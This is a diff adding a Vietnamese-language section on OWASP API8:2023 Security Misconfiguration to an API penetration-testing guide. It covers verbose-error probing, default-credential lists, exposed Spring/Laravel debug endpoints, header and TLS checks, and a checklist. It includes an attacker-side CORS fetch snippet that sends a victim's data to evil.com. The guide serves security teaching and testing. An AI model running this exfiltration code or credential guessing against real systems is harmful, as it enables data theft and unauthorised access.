@@ -39,6 +39,11 @@
   - [Kịch bản kinh điển](#kịch-bản-kinh-điển)
   - [Các cách khai thác](#các-cách-khai-thác-6)
   - [Checklist khi test](#checklist-khi-test-6)
+- [API8:2023 — Security Misconfiguration](#api82023--security-misconfiguration)
+  - [Khái niệm](#khái-niệm-7)
+  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-7)
+  - [Các cách khai thác](#các-cách-khai-thác-7)
+  - [Checklist khi test](#checklist-khi-test-7)
 
 ---
 
@@ -1187,3 +1192,177 @@ Gọi vào internal API không có auth vì chỉ lắng nghe localhost.
 - [ ] Kiểm tra cloud metadata endpoint tương ứng (AWS/GCP/Azure)
 - [ ] Thử `file://` protocol để đọc file hệ thống
 - [ ] Kiểm tra open redirect có thể dùng để bypass URL filter không
+
+---
+
+# API8:2023 — Security Misconfiguration
+
+## Khái niệm
+
+Security Misconfiguration xảy ra khi **hệ thống được cấu hình sai hoặc thiếu cấu hình bảo mật**, tạo ra các điểm yếu mà attacker có thể khai thác mà không cần kỹ thuật phức tạp.
+
+**Ví dụ thực tế:**
+Dev deploy API lên production nhưng quên tắt debug mode. Response trả về stack trace đầy đủ kể cả tên thư viện, phiên bản, đường dẫn file trên server — attacker có ngay bản đồ để tìm CVE tương ứng.
+
+**Điểm mấu chốt:**
+Khác với các lỗi trước đòi hỏi logic khai thác phức tạp, Security Misconfiguration thường **lộ ra ngay từ bước reconnaissance** — chỉ cần gửi request và đọc response cẩn thận.
+
+> **CWE liên quan:** CWE-16 — Configuration
+
+---
+
+## Tại sao bị lỗi?
+
+| Nguyên nhân | Mô tả |
+|-------------|-------|
+| Debug mode bật trên production | Stack trace, error detail lộ ra ngoài |
+| Default credentials | Admin/admin, root/root chưa đổi |
+| CORS cấu hình sai | `Access-Control-Allow-Origin: *` trên API nhạy cảm |
+| HTTP header bảo mật thiếu | Không có `HSTS`, `X-Frame-Options`, `CSP` |
+| TLS cấu hình yếu | Hỗ trợ TLS 1.0/1.1, cipher suite yếu |
+| Endpoint nhạy cảm public | `/actuator`, `/metrics`, `/debug`, `/env` lộ ra ngoài |
+| Verbose error message | Response tiết lộ tên DB, query, đường dẫn file |
+
+---
+
+## Các cách khai thác
+
+### 1. Verbose Error — Đọc Stack Trace
+Gửi request sai cố ý để trigger error và đọc thông tin hệ thống.
+```http
+# Gửi sai kiểu dữ liệu
+GET /api/users/abc HTTP/1.1   ← truyền string thay vì integer
+
+GET /api/orders?date=not-a-date HTTP/1.1
+
+POST /api/login HTTP/1.1
+{"username": null, "password": null}
+```
+Nếu server trả về:
+```json
+{
+  "error": "invalid input syntax for type integer: \"abc\"",
+  "detail": "SELECT * FROM users WHERE id = 'abc'",
+  "hint": "PostgreSQL 14.2 on x86_64-pc-linux-gnu"
+}
+```
+→ Lộ DB engine, phiên bản, cấu trúc query.
+
+---
+
+### 2. Default Credentials
+Thử các credential mặc định của framework / service phổ biến.
+```http
+POST /api/login HTTP/1.1
+{"username": "admin",    "password": "admin"}
+{"username": "admin",    "password": "password"}
+{"username": "admin",    "password": "123456"}
+{"username": "root",     "password": "root"}
+{"username": "test",     "password": "test"}
+{"username": "swagger",  "password": "swagger"}
+```
+
+---
+
+### 3. CORS Misconfiguration
+Server phản chiếu bất kỳ `Origin` nào → attacker có thể đọc response từ domain khác.
+```http
+# Gửi request với Origin giả
+GET /api/users/me HTTP/1.1
+Origin: https://evil.com
+
+# Response bị lỗi trả về
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+```
+Attacker dùng trang web của mình để đọc API response của victim.
+```javascript
+// [ATTACKER] — chạy trên evil.com
+fetch("https://target.lab/api/users/me", { credentials: "include" })
+  .then(r => r.json())
+  .then(data => fetch("https://evil.com/steal?d=" + JSON.stringify(data)))
+```
+
+---
+
+### 4. Exposed Debug / Admin Endpoint
+Các endpoint quản trị bị để public mà không có auth.
+```http
+# Spring Boot Actuator
+GET /actuator HTTP/1.1
+GET /actuator/env HTTP/1.1        ← biến môi trường, credentials
+GET /actuator/heapdump HTTP/1.1   ← dump toàn bộ memory
+GET /actuator/mappings HTTP/1.1   ← danh sách tất cả endpoint
+
+# Laravel Telescope / Debugbar
+GET /_debugbar/open HTTP/1.1
+GET /telescope/api/requests HTTP/1.1
+
+# Django Debug
+GET /admin/ HTTP/1.1
+```
+
+---
+
+### 5. HTTP Security Header Missing
+Kiểm tra header bảo mật bị thiếu — mở đường cho XSS, clickjacking, MITM.
+```bash
+# [ATTACKER]
+curl -I https://target.lab/api/users/me
+```
+Nếu response thiếu các header sau → misconfiguration:
+```
+Strict-Transport-Security    ← thiếu → dễ bị MITM downgrade
+X-Content-Type-Options       ← thiếu → MIME sniffing
+X-Frame-Options              ← thiếu → clickjacking
+Content-Security-Policy      ← thiếu → XSS dễ khai thác hơn
+```
+
+---
+
+### 6. Unnecessary HTTP Methods
+Server cho phép các method không cần thiết.
+```http
+OPTIONS /api/users HTTP/1.1
+
+# Response tiết lộ
+Allow: GET, POST, PUT, DELETE, PATCH, TRACE, CONNECT
+```
+`TRACE` có thể bị lợi dụng để đọc cookie HttpOnly qua XST (Cross-Site Tracing).
+
+---
+
+### 7. TLS / SSL Misconfiguration
+```bash
+# [ATTACKER] — kiểm tra phiên bản TLS và cipher suite
+nmap --script ssl-enum-ciphers -p 443 target.lab
+
+# Hoặc dùng testssl.sh
+testssl.sh https://target.lab
+```
+Nếu server hỗ trợ TLS 1.0/1.1 hoặc cipher yếu (RC4, DES, NULL) → dễ bị downgrade attack.
+
+---
+
+### 8. Sensitive Data trong Response Header
+Header đôi khi tiết lộ thông tin stack.
+```http
+HTTP/1.1 200 OK
+Server: Apache/2.4.49 (Ubuntu)    ← phiên bản có CVE-2021-41773
+X-Powered-By: PHP/7.4.3            ← phiên bản có nhiều CVE
+X-AspNet-Version: 4.0.30319
+```
+
+---
+
+## Checklist khi test
+
+- [ ] Gửi request sai kiểu dữ liệu — response có stack trace / query không?
+- [ ] Thử default credentials trên tất cả login endpoint
+- [ ] Kiểm tra CORS — gửi `Origin: https://evil.com` xem có bị reflect không
+- [ ] Fuzz các path `/actuator`, `/debug`, `/env`, `/metrics`, `/health`, `/info`
+- [ ] Kiểm tra HTTP security header bằng `curl -I` hoặc securityheaders.com
+- [ ] Gửi `OPTIONS` — có method `TRACE` / `CONNECT` không?
+- [ ] Kiểm tra `Server`, `X-Powered-By` header — có tiết lộ phiên bản không?
+- [ ] Scan TLS bằng `testssl.sh` hoặc `nmap ssl-enum-ciphers`
+- [ ] Kiểm tra Swagger / OpenAPI có bị public không (`/swagger-ui`, `/api-docs`)
